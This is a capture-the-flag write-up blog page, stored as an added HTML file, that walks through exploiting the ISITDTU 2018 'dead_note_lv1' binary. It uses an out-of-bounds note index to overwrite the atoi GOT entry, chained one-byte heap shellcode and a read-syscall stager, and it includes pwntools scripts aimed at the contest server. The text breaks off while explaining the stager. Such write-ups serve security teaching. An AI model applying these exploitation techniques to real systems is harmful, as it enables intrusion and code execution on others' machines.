@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>ISITDTU CTF 2018 Quals - dead_note_lv1 | kileak</title>
+
+
+
+
+
+<meta name="description" content="ISITDTU CTF 2018 Quals - dead_note_lv1">
+
+
+<meta name="keywords" content="isitdtu">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/isitdtu-deadnote1/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">ISITDTU CTF 2018 Quals - dead_note_lv1</h1>
+      <p class="post-meta">Jul 27, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>ISITDTU CTF 2018 Quals - dead_note_lv1
+<!--break--></p>
+
+  <p>19 Solves</p>
+
+  <p>nc 159.89.197.67 3333</p>
+
+  <p>Link Binary: https://bit.ly/2LSmqQt</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/deadnote1/dead_note_lv1">dead_note_lv1</a> <a href="https://kileak.github.io/assets/deadnote1/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : disabled
+PIE       : ENABLED
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">********************Dead Note*******************
+*                                              *
+* 1 - Add Note                                 *
+* 2 - Del Note                                 *
+* 3 - Exit                                     *
+*                                              *
+************************************************
+Your choice:</code></pre></figure>
+
+<p>From the first look of the menu, we could expect a regular heap pwn, except that it’s not…</p>
+
+<p>When trying to add new notes, it will mostly always complain about <code class="language-plaintext highlighter-rouge">Big size~~</code> not letting us add a new note, so let’s take a look at the function for adding notes:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">add_note</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Number of Note: "</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">number</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">number</span> <span class="o">&lt;=</span> <span class="n">MAX_READ</span><span class="p">)</span> <span class="p">{</span>      
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+    <span class="n">read_string</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">number</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>  <span class="c1">// oob write</span>
+
+      <span class="n">MAX_READ</span> <span class="o">-=</span> <span class="n">number</span><span class="p">;</span>
+
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Done~~"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Big size~~"</span><span class="p">);</span>    
+  <span class="p">}</span>
+  <span class="k">else</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound~~"</span><span class="p">);</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>So, we’re only allowed to add new notes with a max length of 3 bytes. Our input will then be copied to the heap via <code class="language-plaintext highlighter-rouge">strdup</code>, which will allocate consecutive <code class="language-plaintext highlighter-rouge">0x20</code> chunks on the heap and put our string into it.</p>
+
+<p>The function fails to check, if the <code class="language-plaintext highlighter-rouge">idx</code> is inside the note table, so we can use this to overwrite arbitrary addresses in the bss with the address to our note. This might come in handy later on.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="nf">delete_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>                  <span class="c1">// No check on index</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Can not delete blank note~~"</span><span class="p">);</span>  <span class="c1">// shows message, but doesn't return</span>
+
+  <span class="n">free</span><span class="p">(</span><span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+  <span class="n">NOTE_TABLE</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="p">(</span><span class="n">MAX_READ</span><span class="o">++</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">delete_note</code> function can be a bit confusing, because if we specify a note, that exists, it will show the message <code class="language-plaintext highlighter-rouge">Can not delete blank note~~</code>, but not complain if we select a note, that doesn’t exist.</p>
+
+<p>But that message can be ignored, since it won’t return, but execute the <code class="language-plaintext highlighter-rouge">free</code> anyways. Like <code class="language-plaintext highlighter-rouge">add_note</code>, it also fails to check if <code class="language-plaintext highlighter-rouge">index</code> is inside the note boundary, which could be used to free pointers before our note list. Though this isn’t useful for exploiting this challenge.</p>
+
+<p>While running <code class="language-plaintext highlighter-rouge">vmap</code> in gdb, it gets quite obvious, what’s the target of the challenge:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ vmmap
+Start              End                Perm  Name
+0x0000555555554000 0x0000555555556000 r-xp  /vagrant/Challenges/isit/pwn/deadnote/dead_note_lv1
+0x0000555555755000 0x0000555555756000 r-xp  /vagrant/Challenges/isit/pwn/deadnote/dead_note_lv1
+0x0000555555756000 0x0000555555757000 rwxp  /vagrant/Challenges/isit/pwn/deadnote/dead_note_lv1
+0x0000555555757000 0x0000555555759000 rwxp  [heap]
+0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp  /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 ---p  /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp  /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp  /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp  mapped
+0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp  /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7fe6000 0x00007ffff7fe9000 rwxp  mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p  [vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp  [vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp  /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp  /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rwxp  mapped
+0x00007ffffffde000 0x00007ffffffff000 rwxp  [stack]
+0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]</code></pre></figure>
+
+<p>The heap is marked <code class="language-plaintext highlighter-rouge">rwx</code>, so we could use <code class="language-plaintext highlighter-rouge">add_note</code> to place some shellcode there. But how could we get it to execute?</p>
+
+<p>Well, there comes the <code class="language-plaintext highlighter-rouge">oob write</code> from <code class="language-plaintext highlighter-rouge">add_note</code> to help. Since, we can specify negative indices, and the <code class="language-plaintext highlighter-rouge">got</code> table is before the <code class="language-plaintext highlighter-rouge">NOTE_TABLE</code>, we can just add a note and store its address in <code class="language-plaintext highlighter-rouge">atoi</code> got.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"159.89.197.67"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">3333</span>
+
+<span class="k">def</span> <span class="nf">add_note</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">number</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">number</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">del_note</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="c1"># calculate offset for atoi got
+</span>  <span class="n">dest</span> <span class="o">=</span> <span class="o">-</span><span class="p">(</span><span class="mh">0x2020e0</span> <span class="o">-</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoi"</span><span class="p">])</span> <span class="o">/</span> <span class="mi">8</span>
+
+  <span class="c1"># create a note and put its address into atoi got  
+</span>  <span class="n">add_note</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"aaa"</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./dead_note_lv1"</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>    
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./dead_note_lv1"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>The next time, we enter some input in the menu, the binary will try to convert it to a number by calling <code class="language-plaintext highlighter-rouge">atoi</code> (with our input as argument), resulting into jumping into our (invalid) <code class="language-plaintext highlighter-rouge">aaa</code> shellcode on the heap.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">*] '/vagrant/Challenges/isit/pwn/deadnote/dead_note_lv1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Starting local process './dead_note_lv1': pid 1750
+[1750]
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x0
+RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp    rax,0xfffffffffffff001)
+RDX: 0xf
+RSI: 0x7fffffffe4a0 ('A' &lt;repeats 16 times&gt;, "`JUUUU")
+RDI: 0x7fffffffe4a0 ('A' &lt;repeats 16 times&gt;, "`JUUUU")
+RBP: 0x7fffffffe4c0 --&gt; 0x7fffffffe4d0 --&gt; 0x555555555020 (push   r15)
+RSP: 0x7fffffffe4a0 ('A' &lt;repeats 16 times&gt;, "`JUUUU")
+RIP: 0x555555554c3a (call   0x555555554a20 &lt;atoi@plt&gt;)
+R8 : 0x7ffff7fe7700 (0x00007ffff7fe7700)
+R9 : 0xd ('\r')
+R10: 0x7ffff7dd1b78 --&gt; 0x555555759020 --&gt; 0x0
+R11: 0x246
+R12: 0x555555554a60 (xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555554c2e:  lea    rax,[rbp-0x20]
+   0x555555554c32:  mov    rdi,rax
+   0x555555554c35:  mov    eax,0x0
+=&gt; 0x555555554c3a:  call   0x555555554a20 &lt;atoi@plt&gt;
+   0x555555554c3f:  mov    rdx,QWORD PTR [rbp-0x8]
+   0x555555554c43:  xor    rdx,QWORD PTR fs:0x28
+   0x555555554c4c:  je     0x555555554c53
+   0x555555554c4e:  call   0x5555555549a0 &lt;__stack_chk_fail@plt&gt;
+Guessed arguments:
+arg[0]: 0x7fffffffe4a0 ('A' &lt;repeats 16 times&gt;, "`JUUUU")
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe4a0 ('A' &lt;repeats 16 times&gt;, "`JUUUU")
+0008| 0x7fffffffe4a8 ("AAAAAAAA`JUUUU")
+0016| 0x7fffffffe4b0 --&gt; 0x555555554a60 (xor    ebp,ebp)
+0024| 0x7fffffffe4b8 --&gt; 0xb290969e8e0a6f00
+[------------------------------------------------------------------------------]
+
+...
+
+[-------------------------------------code-------------------------------------]
+   0x555555554a10 &lt;signal@plt&gt;: jmp    QWORD PTR [rip+0x201652]        # 0x555555756068
+   0x555555554a16 &lt;signal@plt+6&gt;: push   0xa
+   0x555555554a1b &lt;signal@plt+11&gt;:  jmp    0x555555554960
+=&gt; 0x555555554a20 &lt;atoi@plt&gt;: jmp    QWORD PTR [rip+0x20164a]        # 0x555555756070
+ | 0x555555554a26 &lt;atoi@plt+6&gt;: push   0xb
+ | 0x555555554a2b &lt;atoi@plt+11&gt;:  jmp    0x555555554960
+ | 0x555555554a30 &lt;exit@plt&gt;: jmp    QWORD PTR [rip+0x201642]        # 0x555555756078
+ | 0x555555554a36 &lt;exit@plt+6&gt;: push   0xc
+ |-&gt;   0x555555759010:  (bad)  
+       0x555555759011:  (bad)
+       0x555555759012:  (bad)
+       0x555555759013:  add    BYTE PTR [rax],al
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+
+[-------------------------------------code-------------------------------------]
+=&gt; 0x555555759010:  (bad)  
+   0x555555759011:  (bad)  
+   0x555555759012:  (bad)  
+   0x555555759013:  add    BYTE PTR [rax],al
+[------------------------------------stack-------------------------------------]</code></pre></figure>
+
+<p>Ok, so now we’re able to execute our super short shellcode, but how to do anything useful with it. Well, we can use shellcode, that jumps from one chunk to the next.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/30gx 0x0000555555759010-0x10
+0x555555759000: 0x0000000000000000  0x0000000000000021
+0x555555759010: 0x0000000000626262  0x0000000000000000
+0x555555759020: 0x0000000000000000  0x0000000000000021
+0x555555759030: 0x0000000000636363  0x0000000000000000
+0x555555759040: 0x0000000000000000  0x0000000000000021
+0x555555759050: 0x0000000000646464  0x0000000000000000
+0x555555759060: 0x0000000000000000  0x0000000000020fa1</code></pre></figure>
+
+<p>Our shellcodes are stored exactly <code class="language-plaintext highlighter-rouge">0x20</code> bytes from each other, so we could do a <code class="language-plaintext highlighter-rouge">jmp +0x20</code> in every shellcode to jump to the next chunk. Since a <code class="language-plaintext highlighter-rouge">jmp</code> takes up at least 2 bytes, we have 1 byte per shellcode chunk to do something useful (also we’ll <code class="language-plaintext highlighter-rouge">jmp +0x1f</code>, since the offset is moved by one after executing the first opcode).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">&gt;&gt;&gt; asm ("jmp $+0x1f")
+'\xeb\x1d'</code></pre></figure>
+
+<p>Though with only 1 opcode, we won’t be able to do a <code class="language-plaintext highlighter-rouge">syscall</code> or something similar useful.</p>
+
+<p>But take a closer look at the registers, when our first shellcode gets executed. Since it’s calling <code class="language-plaintext highlighter-rouge">atoi</code> it will hold our last input in <code class="language-plaintext highlighter-rouge">rsi</code> (16 bytes of input that is) and the stack is also marked <code class="language-plaintext highlighter-rouge">rwx</code>. This would make a good target for a stager shellcode, if we would be able to jump there.</p>
+
+<p>Well, we can, by just pushing <code class="language-plaintext highlighter-rouge">rsi</code> to the stack and then do a <code class="language-plaintext highlighter-rouge">ret</code>, which both happen to be 1 opcode instructions.</p>
+
+<p>So, our attack plan looks like this</p>
+
+<ul>
+  <li>Put our <code class="language-plaintext highlighter-rouge">jump to input</code> shellcode in multiple notes connected with <code class="language-plaintext highlighter-rouge">jmps</code></li>
+  <li>Return to our <code class="language-plaintext highlighter-rouge">input shellcode</code></li>
+  <li>Let the <code class="language-plaintext highlighter-rouge">input shellcode</code> read another shellcode and execute that one</li>
+  <li>Give it a shellcode, finally executing a shell</li>
+</ul>
+
+<p>To make the first one easier, I allocated a dummy note at the start of the heap, which we could later free and then reallocate into atoi got, so we can start from the beginning of the heap:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+
+  <span class="c1"># Jump to input shellcode
+</span>  <span class="n">SC</span> <span class="o">=</span> <span class="s">"""
+    push rsi
+    ret
+  """</span>
+
+  <span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create dummy note on heap"</span><span class="p">)</span>
+  <span class="n">add_note</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"dum"</span><span class="p">)</span>
+  <span class="n">counter</span> <span class="o">=</span> <span class="mi">1</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Write payload to heap"</span><span class="p">)</span>
+  <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
+    <span class="n">add_note</span><span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"%c%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="s">"</span><span class="se">\xeb\x1d</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Remove dummy note and write first payload opcode to heap"</span><span class="p">)</span>
+  <span class="n">del_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+  <span class="n">dest</span> <span class="o">=</span> <span class="o">-</span><span class="p">(</span><span class="mh">0x2020e0</span> <span class="o">-</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoi"</span><span class="p">])</span> <span class="o">/</span> <span class="mi">8</span>
+  <span class="n">add_note</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"%c%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"</span><span class="se">\xeb\x1d</span><span class="s">"</span><span class="p">))</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send stager shellcode as input to atoi"</span><span class="p">)</span>
+  <span class="n">SC2</span> <span class="o">=</span> <span class="s">"""
+    mov dl, 0xff
+    xor rdi, rdi
+    xor rax, rax
+    syscall
+  """</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">SC2</span><span class="p">))</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+  <span class="k">return</span></code></pre></figure>
+
+<p>After adding the note into <code class="language-plaintext highlighter-rouge">atoi got</code> the binary will wait for our input, which will be the stager shellcode and then jump into our <code class="language-plaintext highlighter-rouge">heap shellcode</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x0
+RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp    rax,0xfffffffffffff001)
+RDX: 0xa ('\n')
+RSI: 0x7fffffffe4a0 --&gt; 0xc03148ff3148ffb2
+RDI: 0x7fffffffe4a0 --&gt; 0xc03148ff3148ffb2
+RBP: 0x7fffffffe4c0 --&gt; 0x7fffffffe4d0 --&gt; 0x555555555020 (push   r15)
+RSP: 0x7fffffffe498 --&gt; 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])
+RIP: 0x555555554a20 (&lt;atoi@plt&gt;:  jmp    QWORD PTR [rip+0x20164a]        # 0x555555756070)
+R8 : 0x7ffff7fe7700 (0x00007ffff7fe7700)
+R9 : 0xd ('\r')
+R10: 0x0
+R11: 0x246
+R12: 0x555555554a60 (xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555554a10 &lt;signal@plt&gt;: jmp    QWORD PTR [rip+0x201652]        # 0x555555756068
+   0x555555554a16 &lt;signal@plt+6&gt;: push   0xa
+   0x555555554a1b &lt;signal@plt+11&gt;:  jmp    0x555555554960
+=&gt; 0x555555554a20 &lt;atoi@plt&gt;: jmp    QWORD PTR [rip+0x20164a]        # 0x555555756070
+ | 0x555555554a26 &lt;atoi@plt+6&gt;: push   0xb
+ | 0x555555554a2b &lt;atoi@plt+11&gt;:  jmp    0x555555554960
+ | 0x555555554a30 &lt;exit@plt&gt;: jmp    QWORD PTR [rip+0x201642]        # 0x555555756078
+ | 0x555555554a36 &lt;exit@plt+6&gt;: push   0xc
+ |-&gt;   0x555555759010:  push   rsi
+       0x555555759011:  jmp    0x555555759030
+       0x555555759013:  add    BYTE PTR [rax],al
+       0x555555759015:  add    BYTE PTR [rax],al
+                                                                  JUMP is taken
+
+...
+
+[-------------------------------------code-------------------------------------]
+   0x55555575900a:  add    BYTE PTR [rax],al
+   0x55555575900c:  add    BYTE PTR [rax],al
+   0x55555575900e:  add    BYTE PTR [rax],al
+=&gt; 0x555555759010:  push   rsi
+   0x555555759011:  jmp    0x555555759030
+   0x555555759013:  add    BYTE PTR [rax],al
+   0x555555759015:  add    BYTE PTR [rax],al
+   0x555555759017:  add    BYTE PTR [rax],al
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe498 --&gt; 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])
+0008| 0x7fffffffe4a0 --&gt; 0xc03148ff3148ffb2
+0016| 0x7fffffffe4a8 --&gt; 0x7fffff00050f
+
+...
+
+ 0x555555759010:  push   rsi
+=&gt; 0x555555759011:  jmp    0x555555759030
+ | 0x555555759013:  add    BYTE PTR [rax],al
+ | 0x555555759015:  add    BYTE PTR [rax],al
+ | 0x555555759017:  add    BYTE PTR [rax],al
+ | 0x555555759019:  add    BYTE PTR [rax],al
+ |-&gt;   0x555555759030:  ret    
+       0x555555759031:  jmp    0x555555759050
+       0x555555759033:  add    BYTE PTR [rax],al
+       0x555555759035:  add    BYTE PTR [rax],al
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe490 --&gt; 0x7fffffffe4a0 --&gt; 0xc03148ff3148ffb2      &lt;== Pointer to our input now on stack
+
+...
+
+RSI: 0x7fffffffe4a0 --&gt; 0xc03148ff3148ffb2
+[-------------------------------------code-------------------------------------]
+=&gt; 0x555555759030:  ret    
+   0x555555759031:  jmp    0x555555759050
+   0x555555759033:  add    BYTE PTR [rax],al
+   0x555555759035:  add    BYTE PTR [rax],al
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe490 --&gt; 0x7fffffffe4a0 --&gt; 0xc03148ff3148ffb2
+
+...
+
+[-------------------------------------code-------------------------------------]
+   0x7fffffffe49c:  push   rbp
+   0x7fffffffe49d:  push   rbp
+   0x7fffffffe49e:  add    BYTE PTR [rax],al
+=&gt; 0x7fffffffe4a0:  mov    dl,0xff
+   0x7fffffffe4a2:  xor    rdi,rdi
+   0x7fffffffe4a5:  xor    rax,rax
+   0x7fffffffe4a8:  syscall
+   0x7fffffffe4aa:  add    bh,bh
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe498 --&gt; 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])</code></pre></figure>
+
+<p>We’re now in our <code class="language-plaintext highlighter-rouge">input shellcode</code>, which just increases <code class="language-plaintext highlighter-rouge">rdx</code> and does a <code class="language-plaintext highlighter-rouge">read</code> syscall into the address from <code class="language-plaintext highlighter-rouge">rsi</code>. Since <code class="language-plaintext highlighter-rouge">rsi</code> still points to our input, we’ll be overwriting our current input shellcode.</p>
+
